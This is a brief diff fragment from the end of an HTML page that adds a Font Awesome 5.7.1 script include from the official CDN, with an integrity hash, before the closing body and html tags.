+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
